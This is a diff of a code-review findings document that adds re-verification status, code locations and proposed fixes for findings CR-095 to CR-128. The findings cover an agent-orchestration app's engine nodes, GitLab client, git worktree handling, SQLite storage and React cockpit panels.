+- **Current location:** resolveMr: lib/engine/nodes/kinds/pipeline/pipeline-node.ts:140-160, lib/engine/nodes/kinds/review/review-node.ts:57-64 (public), lib/engine/nodes/kinds/resolve/resolve-node.ts:84-95 (inline, nullable mrIid); branch naming: lib/engine/nodes/kinds/build/build-run-support.ts:31-44, lib/engine/runtime/fanout/step-flow-manager.ts:407 vs lib/engine/nodes/shared/run-context.ts:91; latest plan: lib/engine/nodes/shared/node-support.ts:120-149 vs lib/engine/flow-engine.ts:903-910
+- **Re-verification note:** The diff-artifact finalize is consolidated in `BuildRunSupport.diffArtifact`. The five latest-plan queries are down to two helpers, but they disagree on ordering (see NEW-C1). MR resolution is still copied three times with different errors, and the branch prefix/slug logic is still duplicated. Fix: a shared `MrTargetResolver.resolve(ctx, branchName)` in `nodes/shared` and a `BranchNamer` used by `buildBranch`, `BuildRunSupport.branchName` and the step-flow manager.
+
 - **Severity:** Medium
 - **Category:** Code quality
 - **Area:** Area 3 — Engine nodes
@@ -2280,6 +2675,10 @@ Original findings, verbatim:
 - **Effort:** M
 
 ### CR-095 [Medium] Nodes and base services reach into the DB and other nodes' rows directly, and the "injected" services aren't really injected
+
+- **Status at `abaa007`:** **Partly fixed**, fix in [Task 48](review-tasks/48-backend-dependency-injection.md)
+- **Current location:** lib/engine/harness/agent-runner.ts:1-3, 12, 56, 60-61, 117-118, 168, 176; lib/engine/nodes/kinds/build/build-node.ts:179-180; lib/engine/nodes/kinds/pipeline/pipeline-node.ts:170-179; lib/engine/nodes/kinds/review/review-node.ts:102
+- **Re-verification note:** `NodeDefinition`/`AgentRunNode` now take support/runner/ctxHelper through the constructor, and resolve updates comments via `NodeSupport.resolveComment`. `AgentRunner` still uses the `db`, `config`, `agentPortRegistry` and `worktreeManager` singletons and raw run/node SQL. Build still reads the plan node's row and `input.model` by type. Nodes call `gitHostRegistry` directly. Fix: inject the db/event sink, port registry and worktree manager into `AgentRunner`, have the plan publish `model` in its output, and inject a git-host resolver.
 
 - **Severity:** Medium
 - **Category:** Boundaries
@@ -2305,6 +2704,10 @@ Original findings, verbatim:
 
 ### CR-096 [Medium] The declarative def cache is module-level mutable state, and kinds dispatch through `switch` instead of a registry
 
+- **Status at `abaa007`:** **Open**, fix in [Task 49](review-tasks/49-node-kind-structure.md)
+- **Current location:** lib/engine/nodes/declarative.ts:16, 53-61, 69-80; lib/engine/nodes/declarative-schemas.ts:148-173
+- **Re-verification note:** Unchanged. A module-level `const cache = new Map()` breaks the singleton rule and goes stale across HMR. Kinds still dispatch through two parallel `switch (row.kind)` blocks. Fix: a `DeclarativeKindRegistry` (kind → schema + ctor) and a `DeclarativeDefCache` created via `lib/singleton.ts`, used by both `parseDeclarativeConfig` and `instantiateDeclarative`.
+
 - **Severity:** Medium
 - **Category:** Boundaries
 - **Area:** Area 3 — Engine nodes
@@ -2322,6 +2725,11 @@ Original findings, verbatim:
 - **Effort:** M
 
 ### CR-097 [Medium] Several plan-step and plan-validation gaps (cycles, id-less steps, wrong ids in the diff)
+
+- **Status at `abaa007`:** **Partly fixed**, fix in [Task 27](review-tasks/27-plan-checklist-integrity.md)
+- **Current severity:** Low (was Medium)
+- **Current location:** lib/engine/nodes/kinds/plan/plan-contract.ts:356-357, lib/engine/nodes/kinds/plan/branch-refinement.ts:154-165, lib/engine/nodes/kinds/build/build-node.ts:213-227
+- **Re-verification note:** Branch `dependsOn` cycles are now rejected in `PlanResponse` (lib/engine/nodes/kinds/plan/schema.ts:123-135), and the patch path diffs against the merged steps. The full scoped sub-plan path still diffs `oldSteps` against the agent's raw `sub.steps` rather than the re-id'd `merged` branch steps, and `diffSteps` still drops id-less steps. Fix: diff against `merged.steps.filter(s => s.branch === branchName)`, the way `scopedPatchOutcome` does.
 
 - **Severity:** Medium
 - **Category:** Correctness
@@ -2341,6 +2749,10 @@ Original findings, verbatim:
 - **Effort:** S
 
 ### CR-098 [Medium] GitLab list endpoints are not paginated — comments beyond 100 discussions and jobs beyond 20 are silently dropped
+
+- **Status at `abaa007`:** **Open**, fix in [Task 31](review-tasks/31-git-host-clients.md)
+- **Current location:** lib/integrations/gitlab/client.ts:98-102, 125-127, 147-149
+- **Re-verification note:** Unchanged. Discussions are capped at one page of 100, pipeline jobs use GitLab's default 20 with no paging, and MR lists are unpaged. The resolve node and pipeline gate miss comments and failed or manual jobs on busy MRs. Fix: a private `paginate<T>(path)` in `GitLabClient` that uses `per_page=100` and follows `x-next-page` up to a bounded page cap.
 
 - **Severity:** Medium
 - **Category:** Correctness
@@ -2365,6 +2777,10 @@ Original findings, verbatim:
 
 ### CR-099 [Medium] GitLab API errors are untyped strings with the full response body; no 429/5xx retry
 
+- **Status at `abaa007`:** **Open**, fix in [Task 31](review-tasks/31-git-host-clients.md)
+- **Current location:** lib/integrations/gitlab/client.ts:75-82, 139-145; lib/integrations/gitlab/git-host.ts:223, 238
+- **Re-verification note:** Unchanged. `api()` throws a plain Error that embeds the full response body, with the status buried in the text. There is no typed error and no 429/5xx retry, so a rate limit during polling fails the node. Fix: `GitHostApiError {status, path, retryAfterMs}` (plus NotFound/Auth subclasses) in the git-host port, with the body truncated to about 500 chars. Add bounded retry with `Retry-After` for idempotent GETs on 429/502/503/504.
+
 - **Severity:** Medium
 - **Category:** Correctness
 - **Area:** Area 4 — DB, git, integrations
@@ -2380,6 +2796,10 @@ Original findings, verbatim:
 - **Effort:** M
 
 ### CR-100 [Medium] Branch and ref names reach git argv without validation or a `--` separator (option-injection surface)
+
+- **Status at `abaa007`:** **Open**, fix in [Task 60](review-tasks/60-security-process-and-network-isolation.md)
+- **Current location:** lib/git/worktrees.ts:485-489, 636; lib/git/local.ts:87, 108, 150, 161, 163, 187; lib/integrations/local-agent/agent.ts:123, 133, 138; lib/engine/runtime/fanout/merge-arena.ts:169, 219, 234, 278-280; lib/engine/nodes/kinds/build/build-run-support.ts:31-44; lib/engine/nodes/kinds/plan/schema.ts:15
+- **Re-verification note:** There is still no branch-name validation or `--end-of-options` before positional refs. `branch_pattern` tokens (`{suffix}`, `{ticket}`) are unsanitized, and the plan step `branch` is a bare `z.string()`. Branch-record `name` is regex-validated, so only the pattern and ticket path remains. Fix: `assertValidBranchName()` in `lib/git` (reject a leading `-`, run `git check-ref-format --branch`, throw `InvalidBranchNameError`) at every public entry point. Insert `--end-of-options` where git supports it.
 
 - **Severity:** Medium
 - **Category:** Correctness
@@ -2398,6 +2818,10 @@ Original findings, verbatim:
 - **Effort:** M
 
 ### CR-101 [Medium] Local-agent `ensureBranch` runs git with no timeout and can target the server's own cwd when no workspace is given
+
+- **Status at `abaa007`:** **Open**, fix in [Task 32](review-tasks/32-agent-ports.md)
+- **Current location:** lib/integrations/local-agent/agent.ts:121-142, 168-170; lib/integrations/local-agent/agent-port.ts:37-38
+- **Re-verification note:** `ensureBranch` still runs `git fetch`/`rev-parse`/`checkout` with no timeout, so a stalled remote blocks `createRun`. The port still falls back to `workspace: ""`. That fallback is latent today because `AgentRunner` always sets `spec.workspace = requireRunCwd(ctx)`, but any other caller would run git in `process.cwd()`. Fix: route `ensureBranch` through the bounded git wrapper (like `lib/git/local.ts:46-53`), and throw a typed error in the port when neither cwd nor workspace is set.
 
 - **Severity:** Medium
 - **Category:** Correctness
@@ -2420,6 +2844,10 @@ Original findings, verbatim:
 
 ### CR-102 [Medium] `local_agent.timeout_ms` setting is exposed in Settings but never enforced — local runs can run forever
 
+- **Status at `abaa007`:** **Open**, fix in [Task 32](review-tasks/32-agent-ports.md)
+- **Current location:** lib/integrations/local-agent/agent.ts:86-95, 159-184, 209-220; app/api/settings/route.ts:82, 140-145
+- **Re-verification note:** Unchanged. `local_agent.timeout_ms` is settable and validated in Settings but nothing reads `defaults().timeoutMs`. `createRun` forwards only sandbox/force, and `streamRun` has no timer, so a wedged local run keeps the node `running` and holds the worktree forever. Fix: arm a timer in `streamRun` (or the port's `stream`) that calls `cancelRun` after `timeoutMs` and rejects with a typed `AgentRunTimeoutError`, or remove the setting.
+
 - **Severity:** Medium
 - **Category:** Correctness
 - **Area:** Area 4 — DB, git, integrations
@@ -2439,6 +2867,10 @@ Original findings, verbatim:
 
 ### CR-103 [Medium] Cache/dep copy falls back to synchronous `fs.cpSync` after a timeout, blocking the Node event loop
 
+- **Status at `abaa007`:** **Open**, fix in [Task 33](review-tasks/33-git-and-worktree-process-safety.md)
+- **Current location:** lib/git/worktree-setup.ts:521-531, lib/git/worktree-setup.ts:23
+- **Re-verification note:** `copyDirCoW` still catches every `cp` failure, including the 120s timeout, and then runs a synchronous `fs.cpSync` over the partial copy, which blocks the whole server. Fix: use `await fs.promises.cp`; on timeout (`err.killed`), remove the partial `dst` and report failure; fall back only when the clone is unsupported.
+
 - **Severity:** Medium
 - **Category:** Correctness
 - **Area:** Area 4 — DB, git, integrations
@@ -2457,6 +2889,10 @@ Original findings, verbatim:
 - **Effort:** S
 
 ### CR-104 [Medium] Setup/install commands: the timeout kills only the shell, and there is no cancellation path
+
+- **Status at `abaa007`:** **Open**, fix in [Task 33](review-tasks/33-git-and-worktree-process-safety.md)
+- **Current location:** lib/git/worktree-setup.ts:534-551
+- **Re-verification note:** `runCommand` still uses `exec(..., { shell: "/bin/bash", timeout })`. The timeout kills only the bash process, so grandchildren of compound install/setup commands keep running, and there is no `AbortSignal` to cancel setup when a flow is cancelled or deleted. Fix: `spawn` with `detached: true`, kill the process group on timeout or abort, and thread an `AbortSignal` through `WorktreeSetupInput`.
 
 - **Severity:** Medium
 - **Category:** Correctness
@@ -2479,6 +2915,10 @@ Original findings, verbatim:
 
 ### CR-105 [Medium] `shared_dirs` entries are not confined to the hub/worktree (path traversal) and the denylist is bypassable
 
+- **Status at `abaa007`:** **Open**, fix in [Task 60](review-tasks/60-security-process-and-network-isolation.md)
+- **Current location:** lib/git/worktree-setup.ts:116-131, lib/git/worktree-setup.ts:490-515
+- **Re-verification note:** `SharedDirsStep` still does `path.join(hub|wt, spec)` without normalizing or checking containment, so `../x` creates links outside the worktree. The `DENIED_SHARED_DIRS` exact-string `Set` check is bypassed by `./node_modules`, `node_modules/` or `a/../node_modules`. Fix: normalize, reject absolute paths and paths starting with `..`, assert `containsPath(hub, src)` and `containsPath(wt, dst)`, and check every path segment against the denylist.
+
 - **Severity:** Medium
 - **Category:** Correctness
 - **Area:** Area 4 — DB, git, integrations
@@ -2496,6 +2936,10 @@ Original findings, verbatim:
 - **Effort:** S
 
 ### CR-106 [Medium] Per-flow clone dir and per-flow worktree dir are the same path (`workspaces/<flowId>`)
+
+- **Status at `abaa007`:** **Open**, fix in [Task 20](review-tasks/20-merge-arena-and-workspaces.md)
+- **Current location:** lib/git/local.ts:68-82, lib/git/local.ts:238-246, lib/engine/runtime/worktree-lifecycle.ts:76-78, lib/engine/runtime/fanout/merge-arena.ts:91, lib/engine/nodes/shared/run-context.ts:107
+- **Re-verification note:** `LocalGit.cloneDir(flowId)`, `workspaceForFlow(flowId)` and `WorktreeManager.worktreeDirForFlow(flowId)` all still resolve to `workspaces/<flowId>`. `MergeArena.ensureWorkspace` now calls `localGit.ensureClone(parentFlowId)` on every arena use, which clones into, or runs `fetch --prune` against, the same directory the parent's local worktree occupies. Fix: namespace the two roots (`workspaces/clones/<id>` and `workspaces/worktrees/<id>`) through one path-builder; no legacy-dir migration is needed.
 
 - **Severity:** Medium
 - **Category:** Correctness
@@ -2516,6 +2960,10 @@ Original findings, verbatim:
 - **Effort:** M
 
 ### CR-107 [Medium] Worktree ensure is de-duplicated per `flow:branch` while the directory is per flow, so concurrent runs can switch branches under a live agent
+
+- **Status at `abaa007`:** **Open**, fix in [Task 20](review-tasks/20-merge-arena-and-workspaces.md)
+- **Current location:** lib/engine/runtime/worktree-lifecycle.ts:183-193, lib/engine/runtime/worktree-lifecycle.ts:76-78, lib/git/worktrees.ts:288-291, lib/git/worktrees.ts:480-495
+- **Re-verification note:** `ensureInFlight` is still keyed on `${flowId}:${branch}` while the directory is per flow. `createWorktree` on an existing worktree still calls `switchWorktreeBranch`, which checks out another branch with no dirty check and no lock, and only warns on failure. Fix: key on `flowId` and re-check the branch once the in-flight ensure settles; refuse to switch when `isWorktreeDirty`, returning `{ switched: false, reason }`; add a per-directory async mutex around create, switch and remove.
 
 - **Severity:** Medium
 - **Category:** Correctness
@@ -2564,6 +3012,10 @@ Original findings, verbatim:
 
 ### CR-108 [Medium] Event ids are not monotonic within a millisecond, so the events cursor (`id > after`) can silently skip events
 
+- **Status at `abaa007`:** **Open**, fix in [Task 30](review-tasks/30-events-feed.md)
+- **Current location:** lib/db/index.ts:853-855, app/api/flows/[id]/events/route.ts:13-18
+- **Re-verification note:** `uid()` is still `Date.now().toString(36) + random`, and the events route still filters `id > ?` while ordering by `created_at, id`, so two events in the same millisecond can be skipped for good. Fix: a monotonic id generator (a per-instance same-millisecond counter), or page on `rowid` or a `(created_at, id)` tuple cursor.
+
 - **Severity:** Medium
 - **Category:** Correctness
 - **Area:** Area 4 — DB, git, integrations; Area 1 — App/API (app/, loaders/)
@@ -2607,6 +3059,10 @@ Original findings, verbatim:
 
 ### CR-109 [Medium] Cursor `getRun`/`reattachRun` swallow every error as "still running"
 
+- **Status at `abaa007`:** **Open**, fix in [Task 32](review-tasks/32-agent-ports.md)
+- **Current location:** lib/integrations/cursorSdk.ts:338-385, lib/integrations/cursor/client.ts:77-80, lib/integrations/cursor/agent-port.ts:58-60
+- **Re-verification note:** `getRun` and `reattachRun` still wrap everything in `catch { return null }`, so auth failures, 404s and network errors look the same as "still running" or "terminal" to reconcile. Fix: return a discriminated result (`running | done | unavailable{error}`) or throw a typed `AgentRunLookupError`, and update the `AgentPort.getRun` contract.
+
 - **Severity:** Medium
 - **Category:** Correctness
 - **Area:** Area 4 — DB, git, integrations
@@ -2627,6 +3083,10 @@ Original findings, verbatim:
 
 ### CR-110 [Medium] Cloud-run cancel after a restart is a silent no-op that reports success
 
+- **Status at `abaa007`:** **Open**, fix in [Task 32](review-tasks/32-agent-ports.md)
+- **Current location:** lib/integrations/cursor/client.ts:96-98, lib/integrations/cursor/agent-port.ts:62-69, lib/integrations/cursorSdk.ts:271-277
+- **Re-verification note:** `CursorClient.cancelRun` still discards the boolean from `cursorAgent.cancelRun`, and the port returns `true` unless it throws. After a restart, a cloud run keeps going while the UI shows it cancelled, and `run.cancel()` rejections are swallowed. Fix: when there is no live handle and the agent id starts with `bc-`, re-attach via `Agent.getRun(..., { runtime: "cloud" })` and call `cancel()`; propagate the result or a typed error.
+
 - **Severity:** Medium
 - **Category:** Correctness
 - **Area:** Area 4 — DB, git, integrations
@@ -2644,6 +3104,10 @@ Original findings, verbatim:
 - **Effort:** S
 
 ### CR-111 [Medium] `pumpRun` can leave a rejected `run.wait()` promise unhandled
+
+- **Status at `abaa007`:** **Open**, fix in [Task 32](review-tasks/32-agent-ports.md)
+- **Current location:** lib/integrations/cursorSdk.ts:299-307
+- **Re-verification note:** `pumpRun` still creates `done = run.wait()` before the `for await` stream loop, with no handler attached. If `stream()` throws and `wait()` later rejects, the rejection is unhandled and can crash the process. Fix: wrap the loop in `try/finally` and `await done.catch(() => {})` in the finally block (or attach a catch immediately).
 
 - **Severity:** Medium
 - **Category:** Correctness
@@ -2667,6 +3131,10 @@ Original findings, verbatim:
 
 ### CR-112 [Medium] One malformed JSON column fails the entire `rows.all()` read
 
+- **Status at `abaa007`:** **Open**, fix in [Task 34](review-tasks/34-db-row-safety.md)
+- **Current location:** lib/db/rows.ts:17-29, lib/db/rows.ts:414-430
+- **Re-verification note:** `jsonCol` still turns a parse failure into a Zod issue, and `RowGateway.all` still calls `schema.parse` per row, so one bad JSON cell (for example non-object `events.data` from `emitEvent`) throws for the whole list, with no table, column or row id in the error. Fix: use `safeParse` in `RowGateway`, raise or log a typed `RowDecodeError` with context, and skip bad rows in `all`; optionally make read-tolerant columns fall back to `null`.
+
 - **Severity:** Medium
 - **Category:** Correctness
 - **Area:** Area 4 — DB, git, integrations
@@ -2687,6 +3155,10 @@ Original findings, verbatim:
 - **Effort:** S
 
 ### CR-113 [Medium] Missing indexes for hot queries
+
+- **Status at `abaa007`:** **Open**, fix in [Task 34](review-tasks/34-db-row-safety.md)
+- **Current location:** lib/db/schema.sql:20-37, lib/db/schema.sql:83, lib/db/schema.sql:114-131, lib/db/schema.sql:151-162, lib/db/schema.sql:299-302, lib/db/schema.sql:325-339
+- **Re-verification note:** No new indexes were added. `runs(node_id|flow_id|run_ref|status)`, `flows(parent_flow_id|gitlab_project_id|status|template_id)`, `plan_steps(sub_flow_id)`, `step_merges(flow_id)` and `hook_deliveries(created_at)` are still unindexed; `cursor_run_id` was renamed to `run_ref`. The redundant `UNIQUE(discussion_id, id)` on `comments` is still there. Fix: add `CREATE INDEX IF NOT EXISTS` statements; this is a schema change, so get approval first.
 
 - **Severity:** Medium
 - **Category:** Correctness
@@ -2714,6 +3186,10 @@ Original findings, verbatim:
 - **Effort:** S
 
 ### CR-114 [Medium] Deleting a repo referenced by any flow throws an unhandled FK error (500); no foreign key declares `ON DELETE` behaviour
+
+- **Status at `abaa007`:** **Open**, fix in [Task 34](review-tasks/34-db-row-safety.md)
+- **Current location:** lib/db/index.ts:90, lib/db/index.ts:988-990, app/api/repos/[id]/route.ts:54-58, lib/db/schema.sql:20-37, lib/db/schema.sql:151-162
+- **Re-verification note:** `deleteRepo` is still a bare `DELETE`, and the route calls it with no checks. Deleting a repo that any flow references throws an FK error (500), and an unknown id returns `{ok:true}`. Fix: add a `RepoService.delete` that throws `NotFoundError` or `RepoInUseError`, mapped to 404/409; longer term, add `ON DELETE` clauses (needs schema approval).
 
 - **Severity:** Medium
 - **Category:** Correctness
@@ -2764,6 +3240,10 @@ Original findings, verbatim:
 
 ### CR-115 [Medium] Row mappers bypassed: hand-written row interfaces and unvalidated `db.get/all` in the area
 
+- **Status at `abaa007`:** **Open**, fix in [Task 34](review-tasks/34-db-row-safety.md)
+- **Current location:** lib/db/index.ts:10-25, lib/db/index.ts:885-889, lib/db/index.ts:913-917, lib/db/index.ts:929-935, lib/integrations/gitlab/client.ts:5-10, lib/integrations/gitlab/client.ts:182-184, lib/integrations/jira/service.ts:5-11, lib/integrations/jira/service.ts:27-29, lib/engine/runtime/worktree-lifecycle.ts:25-34, lib/engine/runtime/worktree-lifecycle.ts:314, lib/db/rows.ts:11, lib/db/rows.ts:43, lib/db/rows.ts:175
+- **Re-verification note:** These still bypass the row schemas: the hand-written `Repo` and `GitLabInstance` interfaces duplicate `RepoRow` and `GitLabInstanceRow` (the latter is still unused), `listMessages` returns `all<any>`, there are still no `JiraInstanceRow`, `WorktreeRemovalRow` or `SettingRow` schemas, `getSetting<T = any>` is still an unchecked cast, and `raw` columns stay `z.string()` despite the header comment. Fix: route these reads through `rows.get/all` with schemas, delete the duplicate interfaces, and make `getSetting` take a Zod schema.
+
 - **Severity:** Medium
 - **Category:** Boundaries
 - **Area:** Area 4 — DB, git, integrations
@@ -2788,6 +3268,10 @@ Original findings, verbatim:
 - **Effort:** M
 
 ### CR-116 [Medium] `lib/db/index.ts` is a god module: connection, migrations, data fixes, seed content and four domain stores
+
+- **Status at `abaa007`:** **Open**, fix in [Task 48](review-tasks/48-backend-dependency-injection.md)
+- **Current location:** lib/db/index.ts:34-991 (migrations and data fixes 73-585, template seed 586-845, stores 870-990)
+- **Re-verification note:** `Database` is now about 1,000 lines and still owns the connection, about 12 migration and data-fix routines, the SDLC template seed and the messages, events, settings and repo stores. Many of those routines are legacy back-compat (tickets→tasks rename, `migrateLegacyTicketRefs`, the legacy SDLC `mcp_sources` fix, binding pre-template flows), so most can be deleted rather than moved, given the no-legacy policy. Fix: delete the legacy migrations, then split into `Database`, `SchemaMigrator`, `TemplateSeeder` and `lib/db/stores/*`, each registered via `processSingleton`.
 
 - **Severity:** Medium
 - **Category:** Boundaries
@@ -2823,6 +3307,10 @@ Original findings, verbatim:
 
 ### CR-117 [Medium] Integration secrets stored in plaintext SQLite and read directly by integrations, bypassing `lib/config.ts`
 
+- **Status at `abaa007`:** **Open**, fix in [Task 61](review-tasks/61-security-secrets-at-rest-and-rendering.md)
+- **Current location:** lib/db/schema.sql:183-200, lib/db/schema.sql:202, lib/integrations/cursor/credentials.ts:9-16, lib/integrations/gitlab/client.ts:182-184, lib/integrations/jira/service.ts:27-29
+- **Re-verification note:** GitLab PATs, Jira tokens and `settings.cursor.api_key` are still plaintext, read directly from `db` by each integration, and `SELECT *` instance listing still pulls tokens into every routing call. Fix: add a `SecretStore`, the only reader of token columns, encrypting at rest with a key from `lib/config.ts`, and project tokens out of list queries. This is an owner design decision.
+
 - **Severity:** Medium
 - **Category:** Boundaries
 - **Area:** Area 4 — DB, git, integrations
@@ -2846,6 +3334,10 @@ Original findings, verbatim:
 
 ### CR-118 [Medium] Integrations and row gateway import the global `db` instead of taking injected dependencies
 
+- **Status at `abaa007`:** **Open**, fix in [Task 48](review-tasks/48-backend-dependency-injection.md)
+- **Current location:** lib/integrations/gitlab/client.ts:3, lib/integrations/gitlab/client.ts:176-200, lib/integrations/jira/service.ts:3, lib/integrations/jira/service.ts:25-60, lib/integrations/local-agent/agent.ts:13, lib/integrations/local-agent/agent.ts:86-94, lib/integrations/gitlab/git-host.ts:167-239, lib/db/rows.ts:4, lib/db/rows.ts:413-430
+- **Re-verification note:** `GitLabService`, `JiraService`, `LocalAgentService` and `RowGateway` still import the module-level `db`, and `GitLabHostService` still calls the module-level `gitLab`. The instance-table SQL still lives inside the HTTP integration classes. Fix: extract `GitLabInstanceStore` and `JiraInstanceStore`, then constructor-inject the stores, `GitLabService` and `Database`, wired in the singletons.
+
 - **Severity:** Medium
 - **Category:** Boundaries
 - **Area:** Area 4 — DB, git, integrations
@@ -2865,6 +3357,10 @@ Original findings, verbatim:
 
 ### CR-119 [Medium] Initial event history loads oldest-first, 200 per 3 s poll, and each page invalidates the flow snapshot
 
+- **Status at `abaa007`:** **Open**, fix in [Task 30](review-tasks/30-events-feed.md)
+- **Current location:** components/flows/cockpit/hooks/use-flow-events.ts:25-43, components/flows/cockpit/FlowCockpit.tsx:41-45, app/api/flows/[id]/events/route.ts:13-18
+- **Re-verification note:** The hook still starts at `after=""`, gets 200 events oldest-first per 3-second tick, and has no tail mode, so a long flow takes tens of seconds to show recent activity. Every page changes `lastEventId`, which invalidates `flows.detail` again. Fix: fetch the tail on the first load (a `tail`/`desc` mode capped at `EVENTS_BUFFER_MAX`), or keep fetching while pages come back full, and invalidate the flow detail only once caught up.
+
 - **Severity:** Medium
 - **Category:** Correctness
 - **Area:** Area 5 — Flow runtime UI
@@ -2883,6 +3379,10 @@ Original findings, verbatim:
 - **Effort:** M
 
 ### CR-120 [Medium] `ArtifactLoader` fetches in a raw `useEffect` with no error path: rejections hang on "Loading…" and stale content shows on id change
+
+- **Status at `abaa007`:** **Open**, fix in [Task 13](review-tasks/13-frontend-query-ownership.md)
+- **Current location:** components/flows/panels/ArtifactViews.tsx:102-123 (consumers: ArtifactViews.tsx:37, AgentView.tsx:98, HttpView.tsx:60, ScriptView.tsx:63, BuildView.tsx:189), components/flows/panels/context.ts:25
+- **Re-verification note:** `ArtifactLoader` is still a raw `useEffect` + `useState` fetch with no `.catch`, so a failure hangs on "Loading…" forever, the previous artifact stays on screen when `id` changes, and loading is a bare spinner. The plan panel no longer uses it (`MasterPlanSection` has its own `useQuery` with skeleton, error and retry), but every other panel does. Fix: add a `useArtifact(id)` `useQuery` hook (`staleTime: Infinity`) with skeleton, error-with-retry and content states, then drop `fetchArtifact` from the panel context.
 
 - **Severity:** Medium
 - **Category:** Correctness
@@ -2913,6 +3413,10 @@ Original findings, verbatim:
 
 ### CR-121 [Medium] `useArtifactFetcher` caches HTTP error bodies as artifacts and its "cache" never hits
 
+- **Status at `abaa007`:** **Open**, fix in [Task 13](review-tasks/13-frontend-query-ownership.md)
+- **Current location:** hooks/use-artifact-fetcher.ts:14-28, components/flows/components/plan/components/masterPlanSection/MasterPlanSection.tsx:31-38
+- **Re-verification note:** `useArtifactFetcher` still returns `res.json()` regardless of status, so error bodies are cached as artifacts, and it uses `fetchQuery` with the default `staleTime: 0`, so the cache never hits. `MasterPlanSection` now writes the same `queryKeys.artifacts.detail(id)` key with a throwing `queryFn`, so two different semantics share one key. Fix: one shared `artifactQueryOptions(id)` using `fetchJson` with `staleTime: Infinity`, used by both, ideally inside the CR-120 hook.
+
 - **Severity:** Medium
 - **Category:** Correctness
 - **Area:** Area 5 — Flow runtime UI
@@ -2934,6 +3438,10 @@ Original findings, verbatim:
 
 ### CR-122 [Medium] DecisionView seeds its pick from props once, so a proposal that arrives later is never preselected
 
+- **Status at `abaa007`:** **Open**, fix in [Task 35](review-tasks/35-cockpit-panel-state.md)
+- **Current location:** components/flows/panels/DecisionView.tsx:28-30, components/flows/panels/DecisionView.tsx:39-44, components/flows/panels/DecisionView.tsx:60-69
+- **Re-verification note:** `useState<string[]>(proposed)` still captures `out.chosen` only at mount, so a proposal that arrives by polling is never preselected and the "Confirm" button never shows. Fix: hold only the user's override (`useState<string[] | null>(null)`) and derive `override ?? proposed` during render.
+
 - **Severity:** Medium
 - **Category:** Correctness
 - **Area:** Area 5 — Flow runtime UI
@@ -2954,6 +3462,10 @@ Original findings, verbatim:
 
 ### CR-123 [Medium] AgentView version tabs do nothing when clicked
 
+- **Status at `abaa007`:** **Open**, fix in [Task 35](review-tasks/35-cockpit-panel-state.md)
+- **Current location:** components/flows/panels/AgentView.tsx:37-38, components/flows/panels/AgentView.tsx:92-102
+- **Re-verification note:** `VersionTabs` still gets `sel={latest.id}` and `onSel={() => {}}`, and the loader always renders `latest`, so earlier versions can't be viewed. Fix: add `selId` state with `current = mdArts.find(a => a.id === selId) ?? latest` (the same as `GenericArtifact`), or reuse `GenericArtifact` with a custom renderer.
+
 - **Severity:** Medium
 - **Category:** Correctness
 - **Area:** Area 5 — Flow runtime UI
@@ -2970,6 +3482,10 @@ Original findings, verbatim:
 - **Effort:** S
 
 ### CR-124 [Medium] ChatPanel state carries over between nodes (draft, refine toggle, prompt box, send error)
+
+- **Status at `abaa007`:** **Partly fixed**, fix in [Task 35](review-tasks/35-cockpit-panel-state.md)
+- **Current location:** components/flows/panels/NodePanel.tsx:46-70, components/flows/panels/NodeChat.tsx:17-29, components/chat/components/chatComposerForm/ChatComposerForm.tsx:80
+- **Re-verification note:** The refine toggle and `NodePromptBox` are gone, and the chat panel no longer renders the send error. But the rail and panel are still not keyed by node: `ChatComposerForm`'s `useState(initialDraft)` draft survives a switch between two nodes using the same `NodeChat`, and is then sent to the new node. Panel-local state (for example `DecisionView` `sel` and `AgentView` dialogs) also carries over between same-kind nodes. Fix: render `<NodePanel key={node.node_key} …>` in `FlowCockpit`, or key `<Panel/>` and `<Chat/>` inside `NodePanel`.
 
 - **Severity:** Medium
 - **Category:** Correctness
@@ -2992,6 +3508,9 @@ Original findings, verbatim:
 
 ### CR-125 [Medium] Plan "Edit prompt" first run ignores the Decompose toggle (uses `start_plan`, while the chat path uses `run_node` with `decompose`)
 
+- **Status at `abaa007`:** **Fixed**
+- **Re-verification note:** The plan panel was rewritten (`components/flows/components/plan/`). The "Edit prompt" / `start_plan` path no longer exists, and every plan run or refine goes through the chat rail's `POST /chat`. The Decompose toggle is no longer rendered, so the two entry points can't diverge. `PlanOptionToggles` is still exported but unused and can be deleted.
+
 - **Severity:** Medium
 - **Category:** Correctness
 - **Area:** Area 5 — Flow runtime UI
@@ -3012,6 +3531,10 @@ Original findings, verbatim:
 - **Effort:** S
 
 ### CR-126 [Medium] Prompt previews go stale after a node-config save, and the modal never re-seeds from a fresh refetch
+
+- **Status at `abaa007`:** **Open**, fix in [Task 15](review-tasks/15-frontend-mutation-conventions.md)
+- **Current location:** components/flows/panels/AgentView.tsx:136-141, components/flows/cockpit/FlowCockpit.tsx:65-72, hooks/use-flow-prompt.ts:100-116, hooks/use-flow-prompt.ts:153-160
+- **Re-verification note:** AgentView's Configure save still goes through the cockpit `action`, which only invalidates `flows.detail`, not `promptScope`, `prompts` or `nodePrompt`. `useFlowPrompt` still seeds once per open session from cached data through an effect, so a fresher refetch is ignored. Even the rules save only invalidates `promptScope`, not `prompts` or `nodePrompt`. Fix: invalidate all three prompt key families after `set_node_config`, and derive `edited ?? baseQuery.data.prompt` during render instead of seeding from an effect.
 
 - **Severity:** Medium
 - **Category:** Correctness
@@ -3039,6 +3562,10 @@ Original findings, verbatim:
 
 ### CR-127 [Medium] Hydration mismatches: `window.location.origin` and `Date.now()`/`toLocaleTimeString` in SSR'd panel render
 
+- **Status at `abaa007`:** **Open**, fix in [Task 35](review-tasks/35-cockpit-panel-state.md)
+- **Current location:** components/flows/panels/PanelShell.tsx:106-125, components/flows/panels/ResolveView.tsx:21-26
+- **Re-verification note:** `WaitBanner` still reads `window.location.origin` during render (empty on the server), and `ResolveView` still calls `Date.now()` and `toLocaleTimeString` during render. The cockpit is server-rendered with `initialFlow`, so both cause hydration mismatches. Fix: render a relative `/api/hooks/<id>` path and build the absolute URL only in the copy handler; format the time client-side after mount (a `useSyncExternalStore`/`useIsClient` hook).
+
 - **Severity:** Medium
 - **Category:** Correctness
 - **Area:** Area 5 — Flow runtime UI
@@ -3060,6 +3587,10 @@ Original findings, verbatim:
 - **Effort:** S
 
 ### CR-128 [Medium] Invalid DOM nesting (`<ul>` inside `<p>`, button inside button, interactive inside `role="button"`)
+
+- **Status at `abaa007`:** **Partly fixed**, fix in [Task 36](review-tasks/36-cockpit-a11y-and-rendering.md)
+- **Current location:** components/flows/components/plan/components/subPlanSection/SubPlanCard.tsx:36-80, components/flows/components/plan/components/masterPlanSection/MasterPlanSection.tsx:71-76
